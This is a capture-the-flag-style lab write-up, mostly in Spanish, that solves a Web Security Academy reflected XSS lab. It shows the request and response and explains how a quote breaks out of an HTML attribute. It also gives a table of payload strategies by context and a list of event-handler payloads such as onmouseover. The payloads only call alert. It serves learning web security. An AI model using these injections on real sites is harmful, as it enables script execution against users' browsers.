---
title: "Lab: Reflected XSS into attribute with angle brackets HTML-encoded"
date: 2026-04-25
category: "XSS"
order: 2
tags: ["web-security-academy", "xss", "lab"]
layout: layouts/writeup.njk
permalink: /writeups/xss-lab-reflected-attribute-angle-brackets-encoded.html
---

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.

## Request

```
GET /?search="onmouseover="alert(1) HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://<lab-id>.web-security-academy.net/
```

## Response (fragmento relevante)

```html
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search value=""onmouseover="alert(1)">
        <button type=submit class=button>Search</button>
    </form>
</section>
```

## XSS — Análisis por contexto

### El proceso mental

1. **Probar un payload básico** → `<script>alert(1)</script>`
2. **Ver el código fuente** → buscar dónde se refleja tu input
3. **Analizar el contexto** → ¿cómo llegó tu input a la respuesta?
4. **Adaptar el payload** según lo que encontraste

### Lo que ves en el código fuente

```html
<input value="&lt;script&gt;alert(1)&lt;/script&gt;">
```

### Lo que te dice

- `< >` se convierten en `&lt;` y `&gt;` → están **HTML-encoded**.
- Tu input cae dentro de un **atributo HTML**.

<table>
<tr><td>Observación</td><td>Conclusión</td></tr>
<tr><td><code>&lt; &gt;</code> codificados</td><td><code>&lt;script&gt;</code> no funcionará nunca</td></tr>
<tr><td>Input dentro de <code>value="..."</code></td><td>Puedes escapar el atributo con <code>"</code></td></tr>
</table>

### El payload correcto

```
"onmouseover="alert(1)
```

### Por qué funciona

La `"` cierra el atributo `value` antes de tiempo, y `onmouseover` queda como un nuevo atributo del `<input>`:

```html
<!-- Así queda en el HTML -->
<input value="" onmouseover="alert(1)">
```

No se usaron `< >` en ningún momento.

---

## Regla general

> El payload que uses siempre depende del **contexto donde se refleja tu input**.

<table>
<tr><td>Contexto</td><td>Estrategia</td></tr>
<tr><td>Refleja directo en el HTML</td><td>Usar <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
<tr><td>Dentro de un atributo con <code>&lt; &gt;</code> bloqueados</td><td>Escapar con <code>"</code> y usar eventos (<code>onmouseover</code>, <code>onerror</code>, <code>onclick</code>)</td></tr>
<tr><td>Dentro de JavaScript</td><td>Cerrar el string con <code>'</code> o <code>"</code> e inyectar código JS</td></tr>
</table>

### Eventos útiles sin angle brackets

```html
onmouseover="alert(1)"
onclick="alert(1)"
onerror="alert(1)"
onfocus="alert(1)"
```
